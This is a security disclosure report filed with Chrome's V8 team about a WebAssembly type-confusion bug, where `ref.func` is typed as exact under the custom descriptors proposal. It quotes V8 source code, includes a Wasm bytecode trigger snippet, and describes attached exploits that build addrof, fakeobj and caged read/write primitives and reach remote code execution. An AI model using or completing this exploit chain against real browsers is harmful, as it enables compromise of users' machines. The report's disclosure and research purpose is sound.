# 446113731: Wasm type confusion due to custom descriptors spec unsoundness on `ref.func` exact typing

## ClusterFuzz Report

```
## README

This is *potentially* a Wasm spec-level unsoundness issue. However, there seem to be no public spec documenting how `ref.func` and other operations that yield references work in conjunction with custom descriptors. I am reporting this privately to Google Chrome/V8 as Google seems to be leading the spec work and implementation of custom descriptors the first and practically has the most affected users in the wild.

As this *might* be a spec-level unsoundness which the Wasm community needs to know, I believe that the issue necessitates a quicker disclosure deadline than what is enforced by default by Chrome's disclosure policies. **It would be great if we can coordinate the disclosure within a week from the reported date** - please contact me through email or through the comments. Unless otherwise coordinated, **the spec unsoundness issue is subject to a 14-day disclosure deadline after which the issue, without any specific mentions of Chrome/V8, will be disclosed publicly** on https://github.com/WebAssembly/custom-descriptors/issues. The Chrome/V8 security team is allowed to responsibly disclose this to other vendors and personnel involved in WebAssembly work (at CG meetings or whatnot) under the conditions that 1. the reporter is credited, and 2. is given at least a day's advance notice.


### VULNERABILITY DETAILS

#### Summary

Wasm type confusion due to invalidly typing `ref.func` function types as exact. Imported functions are allowed to be subtypes of the declared function type, and `ref.func` returns the original reference for equivalence with the original import. However, `ref.func` is typed as exact based on its declared function type which is unsound. By abusing `WasmGCTypeAnalyzer` reachability analysis, this may be pivoted into arbitrary Wasm type confusion.

Custom descriptors feature is exposed in the wild by default through Origin Trials from M141, which is currently at Beta and very soon reaches (Early) Stable. This bug is not caused by a recent code change and has existed from the very first feature implementation (approx. 6 months) due to a likely inherent spec unsoundness.

> This bug is notable in that `ref.func` operation itself is completely unrelated to custom descriptors, yet the addition of exactness introduces unsoundness.


#### Details

WebAssembly Custom Descriptors proposal introduces exactness as part of heaptype. An object may only be typed as exact if it is exactly an instance of that type, but not for its subtypes. Most importantly, this is not only valid for struct types but for all indexed types including function types.

Currently, V8 types `ref.func` as exact types of its declared function type:

```cc
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/function-body-decoder-impl.h;drc=43df3221d3b0c1ea8f7d54394a00cb8656204085;l=4240
  DECODE(RefFunc) {
    this->detected_->add_reftypes();
    IndexImmediate imm(this, this->pc_ + 1, "function index", validate);
    if (!this->ValidateFunction(this->pc_ + 1, imm)) return 0;
    ModuleTypeIndex index = this->module_->functions[imm.index].sig_index;
    const TypeDefinition& type_def = this->module_->type(index);
    Value* value =
        Push(ValueType::Ref(index, type_def.is_shared, RefTypeKind::kFunction)
                 .AsExactIfEnabled(this->enabled_));                                // [!] typed as exact based on declared function type
    CALL_INTERFACE_IF_OK_AND_REACHABLE(RefFunc, imm.index, value);
    return 1 + imm.length;
  }
```

Other decoders, e.g. `ModuleDecoderImpl::consume_init_expr()`, `ConstantExpressionInterface::RefFunc()`, also does the same and types it as exact.

However, imported functions may very well be subtypes of the declared type based on Wasm spec. Importing a subtyped function does not violate any JS-Wasm boundary type checks and is perfectly legal:

```cc
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/module-instantiate.cc;drc=e75b1ba2a99aa352048745d44754c5de8be273d8;l=733
ImportCallKind ResolvedWasmImport::ComputeKind(
    DirectHandle<WasmTrustedInstanceData> trusted_instance_data, int func_index,
    const wasm::CanonicalSig* expected_sig, CanonicalTypeIndex expected_sig_id,
    WellKnownImport preknown_import) {
  // ...
  if (!trusted_function_data_.is_null()) {
    if (Tagged<WasmExportedFunctionData> data;
        TryCast(*trusted_function_data_, &data)) {
      if (!data->MatchesSignature(expected_sig_id)) {                               // [!] allows subtype
        return ImportCallKind::kLinkError;
      }
      uint32_t function_index = static_cast<uint32_t>(data->function_index());
      if (function_index >=
          data->instance_data()->module()->num_imported_functions) {
        return ImportCallKind::kWasmToWasm;
      }
      // ...
    }
  }
  // ...
}

// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-objects.cc;drc=e75b1ba2a99aa352048745d44754c5de8be273d8;l=3085
bool WasmExportedFunctionData::MatchesSignature(
    wasm::CanonicalTypeIndex other_canonical_type_index) {
  return wasm::GetTypeCanonicalizer()->IsCanonicalSubtype(                          // [!] allows subtype
      sig_index(), other_canonical_type_index);
}
```

Plus, imported functions preserve their reference for equivalence.

```cc
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/module-instantiate.cc;drc=e75b1ba2a99aa352048745d44754c5de8be273d8;l=2335
bool InstanceBuilder::ProcessImportedFunction(
    DirectHandle<WasmTrustedInstanceData> trusted_instance_data,
    int import_index, int func_index, DirectHandle<Object> value,
    WellKnownImport preknown_import) {
  // ...
  // Store any {WasmExternalFunction} callable in the instance before the call
  // is resolved to preserve its identity. This handles exported functions as
  // well as functions constructed via other means (e.g. WebAssembly.Function).
  if (WasmExternalFunction::IsWasmExternalFunction(*value)) {
    trusted_instance_data->func_refs()->set(                                        // [!] stores imported function, later returned for ref.func
        func_index, Cast<WasmExternalFunction>(*value)->func_ref());
  }
  // ...
}
```

This indicates that `ref.func` must NOT be typed as an exact type, at the very least for imported functions, as its actual type may be a subtype. However, it is statically typed as an exact (super)type. Consider the following case:
- We have function types `f2 <: f1`
- Module 1 exports `fn : f2`.
- Module 2 imports it as `fn : f1`. This is legal.
- Module 2 executes `ref.func $fn`, yielding type `ref exact $f1`. This is obviously wrong as its real exact type is `ref exact $f2`, but the next line will show it even more obviously.
- Module 2 executes `ref.cast $f1` + `ref.cast $f2` on the object. This results in `ref exact $f1 -> ref $f1 -> ref $f2` casting, which succeeds because the first is a static upcast and the second succeeds dynamically. However, the two types `ref exact $f1` and `ref $f2` are unrelated in subtyping hierarchy; the cast should never have succeeded.
  - Note that without custom descriptors and thus without exactness, the cast should succeed!

So how is this exploitable? Enter `WasmGCTypeAnalyzer` again, which I have first demonstrated that it can be used to pivot seemingly unexploitable Wasm type confusions into attacker-chosen, arbitrary type confusions (b/372269618, b/373703277, b/374790906, b/377620832, ...). After a series of exploits `WasmGCTypeAnalyzer` has been hardened such that most operations that lead to an unreachable state are replaced to trap or otherwise conform with the statically reachable case unconditionally. But we can still run around the mitigations and exploit subtle discrepancies as shown in the below Wasm code, pulled out from the repro (replace `v = f1, v2 = f2, imp = fn`):

```
  kExprBlock, kWasmVoid,
    // make typer track function type as ref v2
    kExprRefFunc, $imp,                                 // decoder: ref exact v (mistyped!), typer: ref v
    kExprLocalTee, 3,
    kGCPrefix, kExprRefCast, $sig_v_v,                  // decoder: ref v (upcast), typer: ref v
    kGCPrefix, kExprRefCast, $sig_v_v2,                 // decoder: ref v2, typer: ref v2, runtime: cast succeed
    kExprDrop,

    // now refine it with ref exact v
    kExprLocalGet, 3,                                   // decoder: ref exact v, typer: ref v2
    kGCPrefix, kExprRefCastNull, kWasmExact, $sig_v_v,  // decoder: ref null exact v (upcast), typer: ref v2

    // exploit implicit type refinement w/ inconsistent types from decoder
    kExprBrOnNonNull, 0,                                // typer: (ref exact v) & (ref v2) = bot on branch taken, runtime: branch taken
    kExprUnreachable,
  kExprEnd,
```

`kExprBrOnNonNull` leads to ` RefineTypeKnowledge(is_null.object(), is_null.type.AsNonNull(), branch)`, where `is_null.type` is taken from the decoder's static typing information. The typer already tracks the object's type as `ref v2`, and as `(ref exact v) & (ref v2) = bot` following code is marked as statically unreachable while it is in fact reached dynamically. Note that both sides of the branch is typed as unreachable, and that there is no statically "reachability compliant" result of `IsNull` that the operation should get reduced into (aside from replacing it with an unconditional trap).

Exploiting such reachability analysis bug has been shown to be possible in prior reports via loop reprocessing bypass, and thus is omitted.

-----

Although I cannot find a spec that describes how `ref.func` should be typed with custom descriptors, it seems that there is enough brokenness across other implementations potentially indicating a spec issue (again, if a spec even exists). Binaryen also documents that they implement this exactness typing rule in [PR #7600](https://github.com/WebAssembly/binaryen/pull/7600).



#### Bisect

Bug introduced by WebAssembly Custom Descriptors, on Origin Trials from M141 and onwards. More specifically, it is introduced in commit [25a0fc85](https://crrev.com/c/6415951) and [dc8cec44](https://crrev.com/c/6504002) which makes `ref.func` exact.



### VERSION

Chrome Version: M141~  
Operating System: All


### REPRODUCTION CASE

Attached as `poc.js` which exploits this issue to alias two unrelated struct types, then uses this type confusion to trigger an arbitrary caged write within the sandbox.

Also attached is `rce.html` which exploits this issue, together with the `wrapper-wasmcpt-uaf` v8sbx bypass, to gain RCE and print out `/flag/flag` to stdout.

You might want to pass `--experimental-wasm-custom-descriptors` on d8 or `--enable-blink-features=WebAssemblyCustomDescriptors` on Chrome to simulate Origin Trials behavior.


### FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: Renderer  
Crash State: Crashes on arbitrary caged write attempt from JIT-compiled Wasm function with `poc.js` / RCE with `rce.html`


### CREDIT INFORMATION

Reporter credit: Seunghyun Lee (@0x10n) of CMU CSD / CyLab
```

## Vulnerability Description

Large self-contained JS exploit (wasm-module-builder inlined). Exploits WasmGC implicit type refinement + decoder inconsistency to construct addrof, fakeobj, caged_read, caged_write, and caged_write_unsafe primitives. Ends with caged_write_unsafe(0x42424242, 0x43434343).

## Capabilities

addrof, fakeobj, caged_read, caged_write, caged_write_unsafe primitives via WasmGC type confusion. Demonstrated: caged_write_unsafe(0x42424242, 0x43434343).
